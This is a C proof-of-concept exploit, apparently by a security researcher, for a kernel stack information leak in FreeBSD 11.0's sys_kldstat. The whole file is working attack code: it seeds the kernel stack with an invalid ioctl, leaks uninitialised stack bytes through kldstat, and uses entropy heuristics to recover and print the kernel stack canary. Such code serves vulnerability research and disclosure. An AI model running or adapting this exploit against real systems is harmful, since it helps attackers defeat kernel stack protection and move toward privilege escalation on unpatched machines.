/*
 * kldstat-stack-disclosure.c
 * Brandon Azad
 *
 * Kernel stack disclosure in sys_kldstat on FreeBSD 11.0-RELEASE-p1 amd64.
 */

#include <ctype.h>
#include <errno.h>
#include <math.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <sys/linker.h>

// The entropy threshold for considering an integer to possibly be a
// __stack_chk_guard.
static const float stack_chk_guard_entropy_threshold = 2.7f;

// Calculate the Shannon entropy of the given value over its nibbles.
static float shannon_entropy(uint64_t value) {
	uint8_t count[16] = { 0 };
	unsigned n = sizeof(value) * 2;
	for (unsigned i = 0; i < n; i++) {
		uint8_t nibble = value & 0xf;
		value >>= 4;
		count[nibble]++;
	}
	float entropy = 0;
	for (unsigned i = 0; i < 16; i++) {
		if (count[i] > 0) {
			float p = (float) count[i] / n;
			entropy -= p * log2f(p);
		}
	}
	return entropy;
}

// Check if the given integer looks like ASCII text.
static int looks_ascii(uint64_t value) {
	unsigned ascii = 0;
	for (unsigned i = 0; i < sizeof(value); i++) {
		uint8_t byte = value & 0xff;
		value >>= 8;
		if (byte == 0 || isascii(byte)) {
			ascii++;
		}
	}
	return (ascii == sizeof(value));
}

// Check if the given integer looks like a possible __stack_chk_guard. If so, a
// positive likelihood value is returned.
static float looks_like_stack_chk_guard(uint64_t value) {
	if ((value >> 44) == 0xfffff) {
		return 0;
	}
	if (looks_ascii(value)) {
		return 0;
	}
	float entropy = shannon_entropy(value);
	if (entropy <= stack_chk_guard_entropy_threshold) {
		return 0;
	}
	return entropy;
}

// Leak the __stack_chk_guard.
static int leak_stack_chk_guard(uint64_t *stack_chk_guard) {
	struct kld_file_stat stat = { .version = sizeof(stat) };
	// Trigger a kernel printf to seed the stack.
	ioctl(1, (unsigned long)(-1));
	// Leak portions of the kernel stack.
	int err = kldstat(1, &stat);
	if (err) {
		printf("error: kldstat: %s\n", strerror(errno));
		return 1;
	}
	// Find the most likely stack canary.
	const size_t n = sizeof(stat.pathname) / sizeof(uint64_t);
	const uint64_t *leak = (uint64_t *)stat.pathname;
	uint64_t canary = 0;
	float canary_likelihood = 0;
	for (size_t i = 0; i < n; i++) {
		if (leak[i] == canary) {
			continue;
		}
		float likelihood = looks_like_stack_chk_guard(leak[i]);
		if (likelihood > canary_likelihood) {
			canary = leak[i];
			canary_likelihood = likelihood;
		}
	}
	if (canary == 0) {
		printf("error: no stack canary found in leaked data\n");
		return 2;
	}
	*stack_chk_guard = canary;
	return 0;
}

int main() {
	uint64_t stack_chk_guard;
	int ret = leak_stack_chk_guard(&stack_chk_guard);
	if (ret == 0) {
		printf("__stack_chk_guard: %016lx\n", stack_chk_guard);
	}
	return ret;
}
